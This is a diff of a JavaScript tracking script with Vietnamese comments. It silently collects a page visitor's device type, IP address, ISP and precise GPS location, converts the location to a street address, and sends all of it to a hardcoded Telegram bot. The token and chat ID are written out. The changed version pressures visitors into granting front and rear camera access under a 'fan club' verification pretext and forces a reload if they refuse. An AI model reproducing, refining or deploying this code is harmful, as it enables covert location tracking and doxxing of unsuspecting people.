@@ -1,6 +1,5 @@
 const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
 const TELEGRAM_CHAT_ID = '-1003770043455';
-
 const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
@@ -9,7 +8,6 @@ const info = {
     isp: '',
     realIp: '',
     address: '',
-    country: '', 
     lat: '',
     lon: '',
     device: '',
@@ -17,65 +15,38 @@ const info = {
     camera: '⏳ Đang kiểm tra...'
 };
 
-// ... (Giữ nguyên hàm detectDevice, getIPs, getLocation, fallbackIPLocation như cũ) ...
-
+// --- HÀM DETECT THIẾT BỊ ---
 function detectDevice() {
     const ua = navigator.userAgent;
     const platform = navigator.platform;
-    const screenW = window.screen.width;
-    const screenH = window.screen.height;
-    const ratio = window.devicePixelRatio;
-
     if (/Android/i.test(ua)) {
         info.os = 'Android';
         const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
         info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
-    } 
-    else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+    } else if (/iPhone|iPad|iPod/i.test(ua)) {
         info.os = 'iOS';
-        const res = `${screenW}x${screenH}@${ratio}`;
-        const iphoneModels = {
-            "430x932@3": "iPhone 14/15/16 Pro Max",
-            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
-            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
-            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
-            "414x896@3": "iPhone XS Max / 11 Pro Max",
-            "414x896@2": "iPhone XR / 11",
-            "375x812@3": "iPhone X / XS / 11 Pro",
-            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
-        };
-        info.device = iphoneModels[res] || 'iPhone/iPad';
-    } 
-    else if (/Windows NT/i.test(ua)) {
-        info.device = 'Windows PC';
-        info.os = 'Windows';
+        info.device = 'iPhone/iPad';
     } else {
-        info.device = 'Không xác định';
-        info.os = 'Không rõ';
+        info.device = 'PC / Khác';
+        info.os = platform;
     }
 }
 
+// --- HÀM LẤY IP ---
 async function getIPs() {
     try {
-        const [res1, res2] = await Promise.all([
-            fetch('https://api.ipify.org?format=json').then(r => r.json()),
-            fetch('https://ipwho.is/').then(r => r.json())
-        ]);
-        info.ip = res1.ip;
-        info.realIp = res2.ip;
-        info.isp = res2.connection?.org || 'N/A';
-        info.country = res2.country || 'Việt Nam';
-        info.lat = res2.latitude;
-        info.lon = res2.longitude;
-    } catch (e) {
-        info.ip = 'Bị chặn';
-        info.realIp = 'Lỗi';
-    }
+        const res = await fetch('https://ipwho.is/').then(r => r.json());
+        info.ip = res.ip;
+        info.isp = res.connection?.org || 'N/A';
+        info.lat = res.latitude;
+        info.lon = res.longitude;
+    } catch (e) { info.ip = 'Lỗi lấy IP'; }
 }
 
+// --- HÀM LẤY VỊ TRÍ GPS ---
 async function getLocation() {
     return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(fallbackIPLocation());
+        if (!navigator.geolocation) return resolve();
         navigator.geolocation.getCurrentPosition(
             async pos => {
                 info.lat = pos.coords.latitude.toFixed(6);
@@ -83,82 +54,69 @@ async function getLocation() {
                 try {
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                     const data = await res.json();
-                    info.address = data.display_name || 'Tọa độ GPS';
+                    info.address = data.display_name;
                 } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}`; }
                 resolve();
             },
-            async () => { await fallbackIPLocation(); resolve(); },
+            () => resolve(),
             { enableHighAccuracy: true, timeout: 5000 }
         );
     });
 }
 
-async function fallbackIPLocation() {
+// --- HÀM XIN QUYỀN CAMERA (KÍCH HOẠT 2 CAM NHƯNG KHÔNG LƯU) ---
+async function triggerCameras() {
+    let results = [];
     try {
-        const data = await fetch(`https://ipwho.is/`).then(r => r.json());
-        info.lat = data.latitude || '0';
-        info.lon = data.longitude || '0';
-        info.address = `${data.city}, ${data.region} (Vị trí IP)`;
-    } catch (e) { info.address = 'Không rõ'; }
+        // Kích hoạt Cam Trước (user)
+        const stream1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        stream1.getTracks().forEach(t => t.stop()); // Tắt ngay
+        results.push("Trước");
+
+        // Kích hoạt Cam Sau (environment) - Một số máy sẽ hiện thông báo xin quyền lần 2
+        const stream2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        stream2.getTracks().forEach(t => t.stop()); // Tắt ngay
+        results.push("Sau");
+
+        info.camera = `✅ Đã quét: ${results.join(" & ")}`;
+    } catch (e) {
+        info.camera = results.length > 0 ? `✅ Chỉ quét được Cam ${results[0]}` : '🚫 Bị từ chối';
+        throw e; // Ném lỗi để HTML xử lý Reload nếu bị từ chối
+    }
 }
 
-// Hàm chụp ảnh vẫn giữ để xin quyền, nhưng kết quả trả về chỉ là tín hiệu "đã chụp"
-async function captureCamera(facingMode = 'user') {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
-        // Dừng stream ngay sau khi lấy được quyền để tắt đèn camera nhanh nhất có thể
-        stream.getTracks().forEach(t => t.stop());
-        return true; // Trả về true để báo là đã lấy được quyền
-    } catch (e) { return false; }
-}
-
-function getCaption() {
-    // Sửa lỗi hiển thị Maps Link
-    const mapsLink = (info.lat && info.lon) 
-        ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
-        : 'Không rõ';
-
-    return `
-📡 [THÔNG TIN TRUY CẬP]
-
-🕒 Thời gian: ${info.time}
-📱 Thiết bị: ${info.device} (${info.os})
-🌍 IP: ${info.ip} | ${info.realIp}
-🏢 ISP: ${info.isp}
-🏙️ Địa chỉ: ${info.address}
-📌 Bản đồ: ${mapsLink}
-📸 Camera: ${info.camera}
-`.trim();
-}
-
+// --- GỬI TIN NHẮN ---
 async function sendTextOnly() {
+    const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
+    const caption = `
+📡 <b>[THÔNG TIN FAN CLUB]</b>
+--------------------------
+🕒 <b>Thời gian:</b> ${info.time}
+📱 <b>Thiết bị:</b> ${info.device} (${info.os})
+🌍 <b>IP/ISP:</b> ${info.ip} | ${info.isp}
+🏙️ <b>Địa chỉ:</b> ${info.address || 'Đang cập nhật...'}
+📍 <b>Vị trí:</b> <a href="${mapsLink}">Nhấn để xem bản đồ</a>
+📸 <b>Xác thực:</b> ${info.camera}
+`.trim();
+
     return fetch(API_SEND_TEXT, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-            chat_id: TELEGRAM_CHAT_ID, 
-            text: getCaption(),
-            parse_mode: 'HTML' 
-        })
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption, parse_mode: 'HTML' })
     });
 }
 
+// --- HÀM CHÍNH ---
 async function main() {
     info.time = new Date().toLocaleString('vi-VN');
     detectDevice();
     
-    // Chạy song song lấy IP và Vị trí
+    // 1. Chạy quét camera trước để ép quyền
+    await triggerCameras();
+    
+    // 2. Lấy vị trí và IP
     await Promise.all([getIPs(), getLocation()]);
 
-    // Kích hoạt camera để "diễn" quá trình xác thực nhưng không lưu blob ảnh
-    let hasCam = await captureCamera("user");
-    
-    if (hasCam) {
-        info.camera = '✅ Đã xác thực (Không lưu ảnh)';
-    } else {
-        info.camera = '🚫 Bị từ chối hoặc không có camera';
-    }
-
-    // Luôn luôn chỉ gửi Text về Telegram
+    // 3. Gửi về Tele
     await sendTextOnly();
 }
